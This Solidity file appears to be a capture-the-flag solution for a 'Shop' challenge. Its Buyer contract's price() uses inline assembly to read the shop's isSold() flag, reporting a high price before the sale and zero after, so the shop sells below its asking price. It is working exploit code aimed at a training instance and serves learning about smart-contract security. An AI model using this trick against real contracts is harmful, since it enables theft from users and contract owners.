// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Shop {
  function buy() external;
}

contract Buyer {
    uint256 public counter;
    address public shop = 0x5Bd14F2C6bA556CFeC957e0266a79BCab854374a;

    function shopBuy() external {
        Shop(shop).buy();
    }

    function price() external view returns (uint256 p) {
        bytes4 sig = 0xe852e741; // keccak256("isSold()")
        address addr = 0x5Bd14F2C6bA556CFeC957e0266a79BCab854374a; // Change it for your instance address

        assembly {
            let rvalue := mload(0x40)
            let ptr := add(rvalue, 0x20)
            mstore(ptr, sig)
            mstore(0x40, add(rvalue, 0x40))
            let success := staticcall(3000, addr, ptr, 4, rvalue, 32)

            switch mload(rvalue)
            case 0 {
              p := 100
            }
            default {
              p:= 0
            }
        }
    }
}
